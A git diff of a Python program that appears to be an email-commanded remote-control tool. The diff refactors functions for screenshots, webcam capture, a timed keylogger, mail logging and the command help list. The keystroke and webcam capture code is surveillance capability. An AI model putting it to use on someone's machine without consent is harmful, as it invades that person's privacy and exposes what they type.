@@ -20,21 +20,21 @@ def decode_mail(msg: str):
     return sender, cmd_list
 
 
-def current_time() -> str:
-    return datetime.now().strftime("%H:%M:%S %d-%m-%Y")
+def current_time():
+    return datetime.now().strftime("%H:%M:%S %d-%b-%Y")
 
 
-def check_ext(file_name) -> str:
+def check_ext(file_name):
     ext = [".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".gif"]
     if not any(file_name.endswith(x) for x in ext):
         file_name += ".png"
     return file_name
 
 
-def capture_SS(cmd_list) -> str:
+def capture_SS(cmd_list):
     file_name = cmd_list[1] if len(cmd_list) > 1 else "Screenshot.png"
-    check_ext(file_name)
-    
+    file_name = check_ext(file_name)
+
     file_name = "Files\\Pictures\\" + file_name
     with open(file_name, "w") as f:
         pass
@@ -46,11 +46,11 @@ def capture_SS(cmd_list) -> str:
 
 def capture_webcam(cmd_list):
     file_name = cmd_list[1] if len(cmd_list) > 1 else "Webcam.png"
-    check_ext(file_name)
-    
+    file_name = check_ext(file_name)
+
     cap = VideoCapture(0)
 
-    message: str = ""
+    message: str = "A picture taken from your webcam at " + current_time() + "."
     file_name = "Files\\Pictures\\" + file_name
     with open(file_name, "w") as f:
         pass
@@ -69,21 +69,20 @@ def capture_webcam(cmd_list):
     return file_name, message
 
 
-def logger(cmd_list):
+def key_logger(cmd_list):
     file_path: str = "Files\\Keylog.txt"
     duration = int(cmd_list[1]) if len(cmd_list) > 1 else 5
-    
+
     # ? Ensure the existence of the file
     with open(file_path, "w") as f:
         pass
-
-    logging.basicConfig(
-        filename=file_path,
-        filemode="w",
-        level=logging.DEBUG,
-        format="%(asctime)s - %(message)s",
-        datefmt="%d-%b-%y %H:%M:%S",
-    )
+    
+    key = logging.getLogger()
+    key.setLevel(logging.INFO)
+    formater = logging.Formatter("%(asctime)s - %(message)s", "%d-%b-%Y %H:%M:%S")
+    file_handler = logging.FileHandler(file_path, mode="w")
+    file_handler.setFormatter(formater)
+    key.addHandler(file_handler)
 
     def on_press(key):
         try:
@@ -94,42 +93,48 @@ def logger(cmd_list):
     with Listener(on_press=on_press) as listener:
         sleep(duration)
         listener.stop()
-
+        
+    key.removeHandler(file_handler)
+    file_handler.close()
     return file_path, duration
 
 
 def note2log(sender, cmd_list, attachment, body):
-    file_path: str = "mail.log"
+    file_path: str = "Files\\mail.log"
+    if not attachment:
+        attachment = "None"
 
     with open(file_path, "a") as log:
         pass
-
-    logging.basicConfig(
-        filename=file_path,
-        filemode="a",
-        level=logging.INFO,
-        format="Time:\t\t%(asctime)s \n%(message)s",
-        datefmt="%d %b %Y %H:%M:%S",
-    )
-    command = ' '.join(cmd_list)
-    attachment = ""
-
+    
+    key = logging.getLogger()
+    key.setLevel(logging.INFO)
+    formater = logging.Formatter("Time:\t\t%(asctime)s \n%(message)s", "%d %b %Y %H:%M:%S")
+    file_handler = logging.FileHandler(file_path, mode="a")
+    file_handler.setFormatter(formater)
+    key.addHandler(file_handler)
+    
+    command = " ".join(cmd_list)
     line = f"From:\t\t{sender}\nContent:\t{command}\n\n"
-    line += f"Reply:\t\t {body}\nAttachment:\t{attachment}\n\n"
+    line += f"Reply:\t\t{body}\nAttachment:\t{attachment}\n"
+    line += "----------------------------------------\n"
+    
     logging.info(line)
+
+    key.removeHandler(file_handler)
+    file_handler.close()
 
 
 def list_command() -> str:
     content = "The supported commands:"
     content += "\n\t- screenshot [file_name]"
-    content += "\n\t- webcam"
+    content += "\n\t- webcam [file_name]"
     content += "\n\t- keylog [time in seconds]"
     content += "\n\t- logout"
     content += "\n\t- shutdown [time in seconds]"
     content += "\n\t- listApp"
     content += "\n\t- listProcess"
     content += "\n\t- terminateProcess [PID/Process Name]"
-    content += "\n\t- dir                            (not available)"
     content += "\n\t- log"
     content += "\n\t- help"
     return content
